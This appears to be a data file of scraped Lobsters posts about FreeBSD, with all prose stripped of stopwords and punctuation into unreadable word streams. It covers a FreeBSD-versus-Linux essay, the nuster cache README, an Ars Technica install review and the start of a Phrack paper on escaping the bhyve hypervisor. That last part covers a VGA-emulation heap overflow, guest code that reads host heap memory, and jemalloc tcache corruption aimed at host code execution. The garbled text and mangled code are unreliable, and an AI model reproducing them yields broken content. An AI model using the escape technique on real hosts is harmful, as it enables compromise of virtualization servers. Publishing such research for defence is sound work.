consumer use provider create chain module connected linux binary compatibility freebsd provides binary compatibility linux allows user install run many linux binary freebsd system without first modify binary specific situation linux binary even perform better freebsd linux linuxspecific operating system feature supported freebsd example linux binary work freebsd overly use specific call enabling virtual mode security event auditing freebsd includes support security event auditing event auditing support reliable finegrained configurable logging variety securityrelevant system event including logins configuration change file network access log record invaluable live system monitoring intrusion detection postmortem analysis freebsd implement sun published basic security module bsm application programming interface api file format interoperable solaris mac o x audit implementation final note article mean exhaustive list technical reason use freebsd gnulinux many reason exist nt addressed however feature stand humble opinion unless specific need use gnulinux specific support hardware usually experience greater sense overview control harmony run manage freebsd situation might experience problem freebsd situation lack hardware support specific third party application linux centric later mostly related desktop application server application example mozilla develops firefox primary focus linux osx window called platform freebsd openbsd netbsd solaris located bottom support list platform mozilla developer reliably access platform build environment given time firefox built mozillacentral platform may may work correctly build platform maintainer community attempt keep platform working platform supported mozilla continuous integration process mozilla routinely test platform mean maintainer freebsd spend extra amount time make sure application firefox compile work freebsd often problem arise mozilla developer nt pay much attention issue problem arise linux window osx go linux centric third party application nt mean application nt work freebsd mean occasionally might experience problem kind example write problem micro editor crash freebsd try open menu altg problem nt exist linux running freebsd server desktop workstation recently migrated system running zfs debian gnulinux arch linux freebsd experienced increase performance also reliability better integration freebsd provides zfs one main workstation run freebsd window manager identical setup running arch linux machine different hard drive pure desktop usage perspective see difference ever reason run arch linux freebsd desktop operating system neither performance wise simplicity wise reason exception unsupported hardware real shame freebsd nt received amount attention gnulinux many many case especially production server commercial usage company gain much running freebsd rather linux often reason run linux habit lack knowledge freebsd next time need deploy new system recommend investigate test freebsd well worth time comment correction please feel free email also found content useful consider supporting patreon
123,Lobsters,freebsd,FreeBSD,Nuster v5.0.0.21 released. A web cache server based on HAProxy,https://github.com/jiangwenyuan/nuster,nuster released web cache server based haproxy,nuster wiki english 中文 日本語 table content introduction feature httptcp loader balancer http cache server restful nosql cache server performance detailed benchmark getting started download download build haproxy install create config file start docker usage basic online haproxy documentation tcp loader balancer httphttps loader balancer http cache server restful nosql cache server directive global nuster manager syntax default context faq manager uri purgemethod global nuster cachenosql syntax default context datasize dictsize dictsize number bucket number key dir dictcleaner datacleaner diskcleaner diskloader disksaver store cleantemp onoff proxy nuster cachenosql syntax default context proxy nuster rule syntax default context name key key wwwexamplecom ttl autottl extend extend format wait onofftime cache usestale onofftime cache inactive offtime code memory onoff store disk onoffsync store etag onoff lastmodified onoff ifunless condition please careful use negation condition sample available certain stage sample fetch using acls fetching sample haproxy configuration cache nosql basic operation set get delete response header peruser data set get client manager enable define endpoint uri purge method usage matrix stats usage output enable disable rule header example update ttl header example update state ttl purging basic purging advanced purging purge name header example advanced purging purge host header example advanced purging purge path delete one one case know query use customized key delete case query part irrelevant delete rule name header example advanced purging purge regex header example purge caution enable access restriction glob store memory disk sample fetch cache nustercachehit boolean cachenosql nusterhost string cachenosql nusteruri string cachenosql nusterpath string cachenosql nusterquery string faq start masterworker mode debug cache post request option httpbufferrequest tunebufsize haproxy configuration restrict access enable example contributing license jiang wenyuan,nuster wiki english 中文 日本語 highperformance http proxy cache server restful nosql cache server based haproxy table content introduction nuster highperformance http proxy cache server restful nosql cache server based haproxy compatible haproxy take full advantage acl functionality haproxy provide finegrained caching policy based content request response server status feature httptcp loader balancer nuster used httptcp load balancer like haproxy feature haproxy inherited compatible haproxy load balancing http support frontend backend http compression http rewriting redirection http fixing monitoring stickiness acls condition content switching http cache server nuster also used http proxy cache server like varnish nginx cache dynamic static http response feature haproxy http acl etc extremely fast powerful dynamic cache ability based http method uri path query header cooky etc based http request response content etc based environment variable server state etc based ssl version sni etc based connection rate number byte etc cache management cache purging cache stats cache ttl disk persistence restful nosql cache server nuster also used restful nosql cache server using http postgetdelete setgetdelete keyvalue object used internal nosql cache sits application database like memcached redis well userfacing nosql cache sits enduser application support header cooky store peruser data endpoint feature haproxy http acl etc conditional cache internal kv cache user facing restful cache support kind data support programming language long http supported disk persistence performance nuster fast test show nuster almost three time faster nginx using single core nearly two time faster nginx three time faster varnish using core see detailed benchmark getting started download download stable version download page production use otherwise git clone source code build make targetlinuxglibc make install prefixusrlocalnuster use use pthread lib omit unnecessary see haproxy install detail create config file minimal config file nustercfg global nuster cache datasize nuster nosql datasize masterworker since default mode http frontend fe bind bind ssl crt examplecompem alpn usebackend pathbeg kv defaultbackend backend nuster cache nuster rule img ttl pathbeg img nuster rule api ttl path apisomeapi server server backend nuster nosql nuster rule ttl nuster listens port accepts http request request start kv go backend make postgetdelete request kvanykey setgetdelete kv object request go backend passed server among request img cached day apisomeapi cached second start usrlocalnustersbinnuster f nustercfg docker docker pull nusternuster docker run v pathtonustercfg etcnusternustercfg ro p nusternuster usage nuster based haproxy directive haproxy supported nuster basic four basic section global default frontend backend find config file global defines processwide often osspecific parameter nuster cache nuster nosql must declared section order use cache nosql functionality default defines default parameter frontend backend section overwritten specific frontend backend section frontend describes set listening socket accepting client connection backend describes set server proxy connect forward incoming connection nuster cache nuster nosql must declared section nuster rule must declared define multiple frontend backend section nuster cachenosql declared nuster cachenosql onoff declared nuster act like haproxy tcp http load balancer although listen complete proxy frontend backend part combined one section use nuster listen use frontend backend pair find haproxy documentation doc online haproxy documentation tcp loader balancer frontend mysqllb bind mode tcp defaultbackend mysqlcluster backend mysqlcluster balance roundrobin mode tcp server server server httphttps loader balancer frontend weblb bind bind ssl crt xxxpem mode http defaultbackend apps backend apps balance roundrobin mode http server server server server ssl verify none http cache server global nuster cache datasize frontend fe bind mode http defaultbackend backend mode http nuster cache nuster rule server restful nosql cache server global nuster nosql datasize frontend fe bind mode http defaultbackend backend nuster nosql mode http nuster rule ttl directive global nuster manager syntax nuster manager onoff uri uri purgemethod method default context global enable managerstatspurge api define endpoint purge method default disabled enabled remember restrict access see faq see manager detail uri define endpoint uri nuster default purgemethod define customized http method purge purge default global nuster cachenosql syntax nuster cache onoff datasize size dictsize size dir dir dictcleaner n datacleaner n diskcleaner n diskloader n disksaver n cleantemp onoff nuster nosql onoff datasize size dictsize size dir dir dictcleaner n datacleaner n diskcleaner n diskloader n disksaver n cleantemp onoff default none context global determines whether use cachenosql memory zone size datasize dictsize created except temporary data created destroyed within request cache related data including http response data key overhead stored memory zone shared process memory allocated memory zone new request cached according defined rule cached unless memory freed temporary data stored memory pool allocates memory dynamically system case available memory pool global internal counter monitor memory usage http response data across process new request cached counter exceeds datasize datasize determines size memory zone along dictsize accepts unit like g g default size byte also minimal size dictsize determines size memory used hash table accepts unit like g g default size byte also minimal size note decides memory used hash table bucket key fact key stored memory zone limited datasize dictsize number bucket different number key new key still added hash table even number key exceeds dictsize number bucket long enough memory nevertheless may lead potential performance drop number key greater dictsize number bucket approximate number key multiplied normally dictsize fine basically bigger better enable stats api check following stats dictnosqllength dictnosqlused dictnosqlused greater dictnosqllength increase dictsize would good idea dictsize removed future release automatically resizing hash table first version added back dir specify root directory disk persistence set order use disk persistence dictcleaner prior manager task like removing invalid cache data resetting dict entry executed iteration http request corresponding indicator pointer increased advanced iteration task moved master process also done iteration parameter set control number time certain task one iteration one iteration dictcleaner entry checked invalid entry deleted default datacleaner one iteration datacleaner data checked invalid data deleted default invalid data ratio greater internal mechanism speed clean process recommended change default value diskcleaner disk persistence enabled data stored file file checked master process deleted invalid example expired one iteration diskcleaner file checked invalid file deleted default diskloader start nuster master process load information data previously stored disk memory one iteration diskloader file loaded default usethread used separate thread created load disk file parameter ignored disksaver master process save disk sync cache data periodically one iteration disksaver data checked saved disk necessary default see store detail cleantemp onoff directory defined dir temporary directory tmp created store temporary file use option determine whether remove temporary file startup default proxy nuster cachenosql syntax nuster cache onoff nuster nosql onoff default context backend determines whether use cachenosql proxy additional nuster rule defined filter proxy put directive filter proxy nuster rule syntax nuster rule name key key ttl autottl extend extend wait onofftime usestale onofftime inactive offtime code code memory onoff disk onoffsync etag onoff lastmodified onoff ifunless condition default none context backend define rule specify cachenosql creating condition property least one rule defined nuster cache cache request asdf second nuster rule asdf ttl path asdf cache request path begin img nuster rule img pathbeg img cache response header cache yes acl reshdrcache reshdr cache yes nuster rule reshdrcache possible recommended declare multiple rule section order important matching process stop first match acl patha path ahtml nuster cache nuster rule ttl nuster rule ttl patha rule never match first rule cache everything name define name rule must globally unique since key key define key cachenosql take string combined following keywords separator method http method getpost scheme http http host host request uri first slash end url path url path request delimiter query exists otherwise empty query whole query string request headername value header name cookiename value cookie name paramname value query name body body request default key cache methodschemehosturi default key nosql getschemehosturi example get http wwwexamplecomq namex typey http header get q namex typey host wwwexamplecom asdf z cookie loggedinyes usernuster result method get scheme http host wwwexamplecom uri q namex typey path q delimiter query namex typey headerasdf z cookieuser nuster paramtype body empty default key produce namex key methodschemehostpathheaderasdfcookieuserparamtype produce null character request key cached http response data cached data sent client ttl autottl set ttl key ttl expired key deleted accepts unit like h default ttl expire key auto used ttl set value smaxage maxage directive cachecontrol header directive cachecontrol handled max value ttl ttl automatically extended using extend keyword extend extend automatically extend ttl format extend default positive integer le le together define four time slot following time ttl ttl access percentage ttl extended new request take place ttl ttl equal wait onofftime cache enabled one request time passed backend server create cache identical request either wait cache created wait time expires wait time forwarded backend server default identical request forwarded backend server first one create cache wait note identical request wait first request finished initialization process eg create cache entry nosql mode wait mode multiple identical post request served order received body last request saved content max value wait usestale onofftime cache determines whether serve stale cache client updated backend server usestale stale cache used serve client usestale default mode request passed backend cache updated wait set otherwise wait wait ontime set usestale time permit using stale cache serve client time second cache updated due backend error max value usestale inactive offtime determines whether delete cache accessed time second regardless validity default inactive set note guaranteed cache get removed time inactive clean process access cache first data get removed new request come first last access time cache get updated cache deleted case disk file atime file used nuster restarts last access time set loaded time max value inactive code cache response status code code default response cached use cache response nuster rule nuster rule code nuster rule code memory onoff save data memory default see store detail disk onoffsync save data disk default memory need set order use disk sync mode see store detail etag onoff enable etag conditional request handling add etag header absent default lastmodified onoff enable lastmodified conditional request handling add lastmodified header absent default ifunless condition define cache using haproxy acl evaluation involves two stage request stage response stage cache performed evaluation request stage true evaluation request stage false true response stage please careful use negation condition sample available certain stage example cache request path begin img nuster rule img pathbeg img work evaluation request stage either true false never true response stage path available response stage cache contenttype response imagejpeg nuster rule jpeg reshdr contenttype imagejpeg work evaluation request stage always false reshdr available request stage either true false response stage cache request path begin img contenttype response imagejpeg wo nt work define rule nuster rule img pathbeg img reshdr contenttype imagejpeg path available response stage reshdr available request stage evaluation never true order make work path need allocated use reponse stage httprequest setvar txnpathimg path acl pathimg var txnpathimg beg img acl reshdrct reshdr contenttype imagejpeg nuster rule pathimg reshdrct use nusterpath nuster rule nusterpath beg img reshdr contenttype imagejpeg another example cache request path begin api wo nt work neither acl nocache pathbeg api nuster rule nocache evaluation nocache api request stage true negation false desired state response stage evaluation nocache always false path available response stage cached negation nocache true work httprequest setvar txnpath path acl nocache var txnpath beg api nuster rule nocache see sample fetch sample fetch introduced nuster see using acls fetching sample section haproxy configuration cache nuster used http proxy cache server like varnish nginx cache dynamic static http response use haproxy functionality terminate ssl normalize http support rewrite url modify header additional functionality provided nuster control cache global nuster cache datasize frontend fe bind mode http defaultbackend backend mode http nuster cache nuster rule path nuster rule key methodschemehostpathdelimiterquerycookieuserid path nuster rule ttl path nuster rule disk path server request accepted nuster check rule one one key created used lookup cache hit cached data returned client otherwise acl tested pass test response cached nosql nuster used restful nosql cache server using http postgetdelete setgetdelete keyvalue object basic operation set curl v x post http curl v x post databinary iconjpg http get curl v http delete curl v x delete http response check status code ok postget succeeds delete always bad request empty value incorrect acl rule etc found post failed rule test get found method allowed internal server error insufficient storage header supported header request name value description contenttype returned get request cachecontrol smaxage maxage used set ttl rulettl auto peruser data using header cookie key save peruser data endpoint nuster rule key methodschemehosturiheaderuserid path mypoint nuster rule key methodschemehosturicookiesessionid path mydata set curl v x post h userid http curl v x post h userid http curl v x post usera data cookie http curl v x post userb data cookie http get curl v http found curl v h userid http ok curl v cookie http ok usera data client use tool libs support http curl postman python request go nethttp etc manager nuster managed via manager api endpoint defined uri accessed making http request along header enable define endpoint uri purge method nuster manager uri internalnuster purgemethod purgex usage matrix method endpoint description get internalnuster get stats post internalnuster enable disable rule update ttl delete internalnuster advanced purge cache purgex anyrealpath basic purge stats nuster stats accessed making http get request endpoint defined uri usage curl http output nuster nustercache nusternosql nustermanager manager manageruri nuster managerpurgemethod purge dict size memory used cache dict byte defined dictsize dictcachesize length cache dict array dictcachelength number used entry cache dict dictcacheused dictcachecleanupidx dictcachesyncidx dictnosqlsize dictnosqllength dictnosqlused dictnosqlcleanupidx dictnosqlsyncidx store memory size cache memory store byte approximate equal dictsize datasize storememorycachesize size used memory cache memory store storememorycacheused number stored cache entry storememorycachecount storememorynosqlsize storememorynosqlused storememorynosqlcount store disk storediskcachedir tmpnustercache storediskcacheloaded yes storedisknosqldir tmpnusternosql storedisknosqlloaded yes stats total number request statscachetotal total number hit request statscachehit total number miss request statscachefetch total number bypass request statscachebypass total number aborted request statscacheabort total response size byte served cache statscachebytes statsnosqltotal statsnosqlget statsnosqlpost statsnosqldelete proxy cache stateon memoryon diskoff stateon memoryon diskon stateon memoryon disksync stateon memoryoff diskon stateon memoryoff diskoff proxy nosql stateon memoryon diskoff stateon memoryon diskon stateon memoryon disksync stateon memoryoff diskon stateon memoryoff diskoff enable disable rule rule disabled run time manager uri disabled rule processed cache created header header value description state enable enable rule disable disable rule name rule name rule enableddisabled proxy name rule proxy name rule keep mind name unique rule name disabledenabled example disable rule curl x post h name h state disable http disable rule defined proxy curl x post h name h state disable http enable rule curl x post h name h state enable http update ttl change ttl affect ttl response cached update ttl existing cache header header value description ttl new ttl see ttl nuster rule name rule name rule changed proxy name rule proxy name rule example curl x post h name h ttl http curl x post h name h ttl http update state ttl state ttl updated time curl x post h name h ttl h state enabled http purging two purging mode basic advanced basic send http method defined purgemethod mypurge path want delete advanced send delete method manager uri defined uri basic purging method deletes specific url requested like curl xpurge http key created way cache created except method get note default cache key contains host cache request like http examplecomtest purge localhost need specify host header curl xpurge h host examplecom http work cache nosql alias delete nosql mode advanced purging purge name cache purged making http delete request manager uri along name header header header value description name nuster rule name cache created rule name purged proxy name cache proxy name example purge cache proxy applb curl x delete h name http purge cache rule curl x delete h name http advanced purging purge host also purge cache host cache host deleted header header value description host host host nusterhost host nusterhost higher precedence host mode cache nosql purge cache nosql data example curl x delete h nusterhost http advanced purging purge path default query part also used cache key multiple cache query differs example rule nuster rule imgs pathbeg imgs request curl http curl http two cache object since default key contains query part order delete delete one one case know query curl xpurge http curl xpurge http work nt know query use customized key delete case query part irrelevant define key like nuster rule imgs key methodschemehostpath pathbeg imgs way one cache created purge without query curl xpurge http work query part required delete rule name curl x delete h name imgs http work nuster rule defined something like nuster rule static pathbeg imgs cs method provides way purge path header header value description path path cache path purged host host host host nusterhost host nusterhost higher precedence host mode cache nosql purge cache nosql data example delete cache path imgstestjpg curl x delete h path imgstestjpg http delete cache path imgstestjpg host curl x delete h path imgstestjpg h nusterhost http advanced purging purge regex also purge cache regex cache path match regex deleted header header value description regex regex cache path match regex purged host host host host nusterhost host nusterhost higher precedence host mode cache nosql purge cache nosql data example delete cache path start imgs end jpg curl x delete h regex imgs jpg http delete cache path start imgs end jpg host curl x delete h regex imgs jpg h http purge caution enable access restriction mixed header use precedence name path host path regex host regex host curl x delete h name h path imgsajpg purge name redundant header use first occurrence curl x delete h name h name purge regex glob example jpg file imgs imgs jpg instead imgs jpg purging cache file proxy name rule name host path regex work disk loader process finished check status stats url store nuster cache nosql support different backend store currently memory disk supported store added memory data stored memory area size defined datasize data persist memory lost restarts disk data stored disk path defined dir data persists restarts mode default disable disk persistence save data disk sync memory set order use mode save data memory first data synced disk later master process one iteration disksaver data checked saved disk sample fetch nuster introduced following sample fetch cache nustercachehit boolean return boolean indicating whether hit used like httpresponse setheader xcache hit nustercachehit cachenosql nusterhost string haproxy reqhdr host except nusterhost used request response stage cachenosql nusteruri string haproxy capturerequri cachenosql nusterpath string haproxy path except nusterpath used request response stage cachenosql nusterquery string haproxy query except nusterquery used request response stage faq start masterworker mode set masterworker global section start nuster w debug set debug global section start nuster nuster related debug message start nuster cache post request enable option httpbufferrequest set body cache rule key default cache key include body request remember put body key field note size request body must smaller tunebufsize tunemaxrewrite requestheadersize default requestheadersize refer option httpbufferrequest tunebufsize section haproxy configuration detail also might good idea put separately dedicated backend example restrict access use powerful haproxy acl something like acl networkallowed src acl purgemethod method purge httprequest deny purgemethod networkallowed enable bind ssl crt pubpem alpn example global nuster manager uri nuster purgemethod mypurge nuster cache datasize nuster nosql datasize masterworker since daemon debug default retries option redispatch timeout client timeout connect timeout server frontend bind mode http acl pathpost path search usebackend pathpost defaultbackend backend balance roundrobin mode must http mode http httpbufferrequest must enabled cache post request option httpbufferrequest acl pathpost path search enable cache proxy nuster cache cache search second work postput nuster rule rpost key methodschemehosturibody ttl pathpost server backend balance roundrobin mode http nuster cache cache ajpg expire acl patha path ajpg nuster rule ttl patha cache mypage key contains cookie userid cached per user acl pathb path mypage nuster rule key methodschemehostpathdelimiterquerycookieuserid ttl pathb cache ahtml response header cache yes httprequest setvar txnpathc path acl pathc var txnpathc str ahtml acl reshdr cache yes nuster rule pathc cache heavy second beconn greater acl heavypage path heavy acl toofast beconn ge nuster rule heavy ttl heavypage toofast cache response header asdf fdsa acl reshdr asdf fdsa nuster rule rescache ttl server frontend bind mode http defaultbackend backend balance roundrobin mode http disable cache proxy nuster cache nuster rule server frontend nosqlfe bind defaultbackend nosqlbe backend nosqlbe nuster nosql nuster rule ttl contributing join development give feedback report issue send pull request spread nuster license copyright c jiang wenyuan koubunen gmail dot com right reserved licensed gpl haproxy haproxy source license notice see relevant individual file
124,Lobsters,freebsd,FreeBSD,Not-actually Linux distro review: FreeBSD 12.1-RELEASE,https://arstechnica.com/gadgets/2020/04/not-actually-linux-distro-review-freebsd-12-1-release/,notactually linux distro review freebsd,enlarge freebsd bsd lee hutchinson ghostbsd bsd linux license cranky installing freebsd zfs darn right,enlarge could used one freebsd stress ball trying get desktop running month linux distro review nt linux distribution taking look freebsd original gangster free unixlike operating system first freebsd release operating system root go back freebsd started patchrelease bill lynne jolitz came original berkeley software distribution bsd bsd go back reference linus torvalds seven year old get started like acknowledge something distro review include desktop experience much freebsd strength freebsd far far better suited running headless server desktop going get full desktop running anyway according lee hutchinson hate also ca nt imagine reader would nt care freebsd provide good desktop experience say least hankering bsdbased desktop nt already planning followup review ghostbsd desktopfocused bsd distribution bsd linux linux need software distribution wrapped around make complete operating system contrast freebsd always complete operating kernel software ecosystem managed maintained group people past allowed freebsd significantly coherent layout typical linux distribution central committee overseeing design maintenance entire o whole distinction go bin usrbin usrlocalbin consistently easily enforced said importance difference eroded significantly last year modern linux distros tend large professional organization behind difficult see freebsd committee oversight freebsd entire operating system differs significantly canonical oversight ubuntu red hat centos fedora one thing remains different two camp kernel license linux kernel licensed core linux kernel developer notoriously cranky potential violation license freebsd kernel along code authored freebsd project licensed twoclause bsd license completely speed open source license sum difference gpl requires derivative code also licensed gpl bsd license gpl also curious definition mean derivative term gpl code link gpl code derivative subject compatible licensing requirement zfs filesystem famous example gpl definition derivative turned head zfs originally developed solaris ported freebsd eventually getting ported linux clear zfs nt derivative linux normal usage word since kernel module must link kernel kernel actual development therefore derivative work according gpl controversial practice many outright proprietary kernel nvidia proprietary binary driver module regardless sticking point many kernel developer contrast bsd license merely requires redistribution bsdlicensed code must include code original copyright allows reuse bsd code within nonbsdlicensed project well vice versa wanted make proprietarybsd sell product user access right source code bsd license would permit simply need acknowledge bsd copyright installing freebsd bsds take pride ascii hiding boot menu user unnecessarily jim salter ooh livecd environment let try install jim salter welcome livecd environment hope nt expecting desktop ok moving back installation jim salter back day server powered dinosaur running treadmill port tree musthave probably relevant folk jim salter installing freebsd distinctly oldschool feel entire process textmode like debian ubuntu server installation necessarily bad thing mean always got keyboard shortcut fast menu rendering defer potential hardwaredriver issue later o installed give staunch freebsd user strongly preferred linux little changed installation process since although nt remember livecd environment warned however livecd environment really useful operating system desktop little preinstalled software simply dropped amnesiac login prompt login root password though nothing give hint get plain shell begin actual installation choose keyboard map hostname optional component install zfs darn right nt need use manual better understand jim salter partitioning disk better choose mbr guid partition choose bsd label get slice instead partition o foggiest idea access disk jim salter nt actually need manually partition disk use zfs good partitioner buggy jim salter despite typed freebsdzfs type field freebsdzfs given example type bottom get invalid argument try jim salter freebsd supported zfs filesystem longer operating system native solaris course going zfs root install proper one multiple disk nt require dig manual partitioner tried anyway need know freebsd partitioner example create partition table bsd label scheme accidentally consigned bsd slice rather proper partition operating system able read disk also found bug partitioner almost giving freebsdzfs example valid field freetype type text box complained invalid argument tried also ca nt simply cancel way get free type freebsd instead could choose nuke whole partition table go back guided installer ok back manual disk setup time choose auto zfs rootonzfs guided install jim salter first step second option typedisks jim salter four disk like set pool mirror going ignore conceptual error choose jim salter part simple four disk available adding vdev jim salter bit gotcha return main zfs configuration menu bottom button select arrow way back install hitting select move u along jim salter like dataloss like dataloss hang yolo format mode engage jim salter guided zfs installer still wart actual pitfall organizing full potentially complex zfs pool simple menued installer trivial task freebsd unfortunately nt get process without reinforcing conceptual error first foremost pool made pool made vdevs individual vdevs turn made disk let say disk available might arrange single vdev roughly disk worth usable storage capacity two disk worth parity perhaps choose vdev instead roughly nine disk worth capacity three disk worth parity escape many user pool consist single vdev might choose instead two sixdiskwide vdevs pool four threediskwide vdevs commonly see pool example typically would mean six twodiskwide mirror vdevs freebsd developer wanted enable automatic provisioning common poolofmirrors scenario broke paradigm selecting virtualdevice type shrugged ignored conceptual error offered virtualdevice type selecting got pool mirror also made cry little inside done configuring disk setup one minor wart deal way main diskconfiguration menu bottom button nt select took confused second three realize needed arrow way back top menu highlight install go back hit select proceed
125,Lobsters,freebsd,FreeBSD,FreeBSD Office Hours – 2020/04/01,https://www.youtube.com/watch?v=6qBm5NM3zTQ,freebsd office hour,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freebsd office hour april youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freebsd office hour april youtube
126,Lobsters,freebsd,FreeBSD,Tale of two hypervisor bugs - Escaping from FreeBSD bhyve,http://phrack.org/papers/escaping_from_freebsd_bhyve.html,tale two hypervisor bug escaping freebsd bhyve,title author date,title tale two hypervisor bug escaping freebsd bhyve author reno robert date april tale two hypervisor bug escaping freebsd bhyve reno robert renorobertr table content introduction vulnerability vga emulation exploitation vga bug analysis memory allocation heap acpi shutdown event handling corrupting tcaches structure discovering base address guest memory bound write write pointer anywhere using unlink mmio emulation rip control methodology faking arenachunks structure arbitrary free code execution using mmio vcpu cache exploitation strategy allocating region another size class free pmio emulation corrupting inouthandlers structure leaking vmctx structure overwriting mmio redblack tree node rip control using pci bar decoding rip control note rop payload process continuation vulnerability firmware configuration device exploitation fwctl bug analysis memory layout bs segment bound write full process rw sandbox escape using pci passthrough analysis cfi safestack hardenedbsd safestack bypass using neglected pointer registering arbitrary signal handler using acpi shutdown conclusion reference source code environment detail introduction vm escape become popular topic discussion last year good amount research topic published various hypervisors like vmware qemu virtualbox xen hyperv bhyve hypervisor freebsd supporting hardwareassisted virtualization paper detail exploitation two bug bhyve vga emulation heap overflow firmware configuration device bs buffer overflow generic technique could used exploiting bhyve bug paper also discus sandbox escape using pci device passthrough controlflow integrity bypass hardenedbsd vulnerability vga emulation freebsd disclosed bug vga device emulation found ilja van sprundel allows guest execute code host bug affect virtual machine configured fbuf framebuffer device patch fixed issue struct dacstate int dacrdindex int dacrdsubindex int dacwrindex int dacwrsubindex dacrdindex dacrdsubindex dacwrindex dacwrsubindex dacpalette dacpalettergb vgadac vga device emulation bhyve us signed integer dac address write mode register dac address read mode register register used access palette ram entry intensity value red green blue data palette ram read written accessing dac data register three successful io access red green blue intensity value dac address write mode register dac address read mode register incremented automatically based operation performed issue value dac address read mode register dac address write mode register wrap index since data type allowing untrusted guest read write past palette ram adjacent heap memory bound read achieved function vgaportinhandler vgac file case dacdataport val sc vgadacdacpalette sc vgadacdacrdindex sc vgadacdacrdsubindex sc vgadacdacrdsubindex sc vgadacdacrdsubindex sc vgadacdacrdindex sc vgadacdacrdsubindex bound write achieved function vgaportouthandler vgac file case dacdataport sc vgadacdacpalette sc vgadacdacwrindex sc vgadacdacwrsubindex val sc vgadacdacwrsubindex sc vgadacdacwrsubindex sc vgadacdacpalettergb sc vgadacdacwrindex sc vgadacdacwrindex sc vgadacdacwrsubindex vulnerability provides powerful primitive read write access heap memory hypervisor user space process issue writing dacpalette rgb value encoded written adjacent dacpalettergb array single value corruption corrected subsequent writes dacpalette array since dacpalettergb placed next dacpalette linear write corrupted memory used correction bhyve process could crash issue faced development exploit freebsd exploitation vga bug though freebsd aslr necessary understand process memory layout guest feature allow allocation deallocation heap memory host process ideal structure corrupt gaining reliable exploit primitive section provides indepth analysis exploitation heap overflow achieve arbitrary code execution host analysis memory allocation heap freebsd us jemalloc allocator dynamic memory management research done huku argp vat jemalloc provides great insight allocator understanding detail provided paper pseudomonarchia jemallocum essential following many part section jemalloc used freebsd slightly different one described paper however core design exploitation technique remain user space bhyve process multithreaded hence multiple thread cache used jemalloc thread prime importance study mevent vcpu n n vcpu number mevent thread main thread initialization part main function bhyverunc file int main int argc char argv memsize mb case error vmparsememsize optarg memsize vmsetmemflags ctx memflags err vmsetupmemory ctx memsize vmmmapall initpci ctx fbsdrunaddcpu ctx bsp bsp rip meventdispatch first allocation importance guest physical memory mapped address space bhyve process preconfigured memory allocated virtual machine vm also configured memory using parameter guest physical memory map along system memory look like found pciemulc guest physical memory map look like following lowmem guest system memory lowmem lowmemlimit memory hole may absent lowmemlimit pci hole bar allocation pci extended config window lapic ioapic hpet firmware highmem lowmemlimit maximum value guest system memory mapped bhyve process calling mmap along requested size guest system memory vmmmapguardsize guard page allocated virtual address space guest system memory vmsetupmemory api liblibvmmapivmmapic performs mentioned operation int vmsetupmemory struct vmctx ctx sizet memsize enum vmmmapstyle vms memsize fit entirely lowmem segment create another highmem segment remainder memsize ctx lowmemlimit ctx lowmem ctx lowmemlimit ctx highmem memsize ctx lowmemlimit objsize gb ctx highmem else ctx lowmem memsize ctx highmem objsize ctx lowmem stake contiguous region covering guest physical memory adjoining guard region len vmmmapguardsize objsize vmmmapguardsize flag mapprivate mapanon mapnocore mapalignedsuper ptr mmap null len protnone flag baseaddr ptr vmmmapguardsize ctx baseaddr baseaddr contiguous allocation guest physical memory made page later marked protread protwrite mapped guest address space baseaddr virtual address guest physical memory next interesting allocation made initialization virtual pci device initpci call main initializes device emulation code including framebuffer device framebuffer device performs initialization vga structure vgasoftc vgac file void vgainit int ioonly struct inoutport iop struct vgasoftc sc int port error sc calloc sizeof struct vgasoftc struct vgasoftc struct memrange mr struct dacstate int dacrdindex int dacrdsubindex int dacwrindex int dacwrsubindex dacpalette dacpalettergb vgadac vgasoftc structure byte overflow happens allocated part tcache bin servicing region size byte framebuffer device also performs allocation part remote framebuffer server however significant exploitation bug next let analyze memory vgasoftc structure guest physical memory guard page identify interesting structure corrupt leak since bound readwrite linear guest leak information guard page file readmemoryc attached code read bhyve heap memory ubuntu lts guest operating system readmemoryc iopl warnx reading bhyve process memory chunklwsize getpagesize pagestoread chunklw calloc chunklwsize sizeof outb dacidxrdport int chunklwsize chunklw inb dacdataport int index index index qword chunklw index qword warnx lx index qword running code guest leak bunch heap pointer root linuxguest setupareadmemory readmemory readmemory readmemory readmemory readmemory readmemory readmemory readmemory readmemory readmemory readmemory readmemory analysis realized tcaches structure used jemalloc inspecting memory gdb provides detail gdb info thread id target id frame lwp process mevent kevent lwp process vcpu ioctl gdb thread switching thread lwp process ioctl gdb print struct tsds state tsdstatenominal tcache threadallocated threaddeallocated proftdata iarena arena arenastdata narenastdata arenastdatabypass false tcacheenabled tcacheenabledtrue jequarantine witness qlhfirst witnessfork false thread threadspecific data located address pointed tcache address found inspecting tsds structure vcpu thread tcache structure one guest could access using vga bug confirmed gdb gdb print struct tcaches link qrenext qreprev profaccumbytes gcticker tick nticks nextgcbin tbins tstats nrequests lowwater lgfilldiv ncached avail since tcache structure accessible tcache metadata corrupted detailed exploitation heap layout analyzed multiple cpu configuration guest single vcpu host single cpu guest single vcpu host one cpu core guest one vcpu host one cpu core observed change number jemalloc arena time number cpu core available number cpu core change heap layout also change marginally say marginally tcache structure still reached vgasoftc structure overflow one vcpu vcpu thread thread cache tcaches thread cache vcpu placed one thread cache structure vcpu thread allocated chunk vgasoftc structure managed arena linear overflow first tcaches structure get corrupted since always available configuration reliable target corrupt cpu affinity exploit running guest set ensure corrupted structure used execution exploit summarize heap layout look like vgasoftc tcaches tcaches tcaches guard guest vcpux page memory memory layout expected consistent couple reason first jemalloc chunk size mapped allocator bhyve make first allocation request libpthreadinit thralloc calloc go series call tcachecreate ipallocztm arenapalloc arenamalloc arenamalloclarge arenarunalloclarge arenachunkalloc chunkalloccore chunkallocmmap pagesmap mmap function skipped libraryprivate function prefix je function name guest memory mapped using vmsetupmemory bhyve initialization occupy memory region right jemalloc chunk due predictable mmap behaviour second vgasoftc structure occupy lower memory address chunk compared tcaches structure jemalloc allocates tcaches structure using tcachecreate serviced large allocation request case vcpu thread make allocation request allocation vgasoftc structure happens much earlier initialization routine compared creation vcpu thread fbsdrunaddcpu acpi shutdown event handling next task find feature allows guest trigger allocation deallocation corrupting tcache metadata inspecting bin interesting allocation found tbins gdb print struct tcaches tbins tstats nrequests lowwater lgfilldiv ncached avail gdb xgx gdb gdb xi powerbuttonhandler push rbp gdb print struct mevent mefunc powerbuttonhandler mefd metimid metype evfsignal meparam mecq mestate meclosefd melist lenext leprev bhyve emulates access io port advanced power management control port enable disable acpi virtual power button handler sigterm signal registered freebsd kqueue mechanism mevent micro event library based kqueue bhyve found meventc library expose 